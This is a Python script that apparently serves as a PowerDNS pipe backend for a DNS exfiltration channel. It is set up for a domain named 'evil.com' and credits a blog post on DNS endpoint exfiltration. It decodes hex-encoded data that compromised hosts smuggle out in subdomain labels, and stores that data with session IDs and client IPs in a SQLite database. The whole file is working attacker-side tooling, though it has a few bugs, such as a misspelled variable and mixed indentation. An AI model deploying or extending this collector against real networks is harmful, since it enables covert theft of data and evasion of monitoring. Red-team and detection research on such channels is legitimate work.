#!/usr/bin/python

"""
Original Author:  @TheXC3LL.
Reference post here: 
https://x-c3ll.github.io/posts/DNS-endpoint-exfiltration/

Current Author and Maintainer: GuM0x
"""

from sys import stdin, stdout, stderr
from datetime import date, datetime, time
import sqlite3


# Basic configuration
domain = "evil.com"
ttl = "30"
ipaddress = "10.22.3.68"
ids = "1"
hostmaster="crazy-gamusino@narnia.net"
soa = '%s %s %s' % ("ns1." + domain, hostmaster, ids)

conn = sqlite3.connect('bribon.db')


# Read STDIN and split tokens
def readLine():
        data = stdin.readline()
        tokens = data.strip().split("\t")
        return tokens

# Handle basic requests
def handleSoa(qname):
        stdout.write("DATA\t" + qname + "\tIN\tSOA\t" + ttl + "\t" + ids + "\t" + soa + "\n")
        stdout.write("END\n")
        stdout.flush()

def handleNS(qname):
        stdout.write("DATA\t" + qname + "\tIN\tA\t" + ttl + "\t" + ids + "\t" + "\t" + ipaddress + "\n")
        stdout.write("END\n")
        stdout.flush()

def handleA(qname, ip):
        stdout.write("DATA\t" + qname + "\tIN\tA\t" + ttl + "\t" + ids + "\t" + ip + "\n")
        stdout.write("DATA\t" + qname +  "\tIN\tNS\t" + ttl + "\t" + ids + "\t" + "ns1." + domain + "\n")
        stdout.write("DATA\t" + qname +  "\tIN\tNS\t" + ttl + "\t" + ids + "\t" + "ns2." + domain + "\n")
        stdout.write("END\n")
        stdout.flush()

def getData(qname, clientip):
        #stderr.write("  [+] Data received!\n")
        #stderr.flush()
        subqname = qname.replace("." + domain, "") 
	domainArr = subqname.split(".")
        if len(domainArr) is 3:
		encoded = domainArr[0]
        	data = encoded.decode('hex')
		part = domainArr[1]
        	session = domainArr[2]
		printErr("DATA -> %s[%s].%s: %s\n" % (clientip, session, part, data,))	   
		now_str = datetime.now().strftime('%Y-%m-%d %H%M%S')
		conn.execute("INSERT INTO queries VALUES(?,?,?,?,?,?)",(now_str, data, part, session, clientip, domain))
		conn.commit()
	else:
	    printErr("ERROR\n")
            stderr.flush()
        # Answer the request
        handleA(qname, ipaddress)

def printErr(text):
	d = datetime.now()
	stderr.write("%s %s" % (d.strftime("%b %d %H:%M:%S"), text))
	stderr.flush()

def printResp(text):
	d = datetime.now()
	stdout.write("%s %s" % (d.strftime("%b %d %H:%M:%S"), text))
	stdout.flush()

# Alive check
printErr( stdin.readline() ) # Use STDERR to print debug info
printResp("Alive!\n")

# Read incoming requests
while True:
        indata = readLine() # Extract info from request
        printErr("indata: %s\n" % indata)
        if len(indata) < 6: # Weird thing, not the kind of message we want
                continue
        qname = indata[1].lower() # Name queried (QNAME)
        qtype = indata[3] # Resource being requested (QTYPE)
        clientip = indata[5]
        # Check if the request is for us
        if qname.endswith(domain):
                # If this is ok, then we can answer the request based on the QTYPE
                if qtype == "SOA":
                        handleSoa(qname)
                if (qtype == "A" or qtype == "ANY"):
                        if qname == domain: # No subdomains
                                handleA(domain, ipadress)
                        elif (qname == "ns1." + domain or qname == "ns2." + qname): # Asking for NS servers
                                handleNS(qname)
                        elif (qname.endswith(domain)): # xxxx.cdn.gamusino.net
                                getData(qname, clientip)
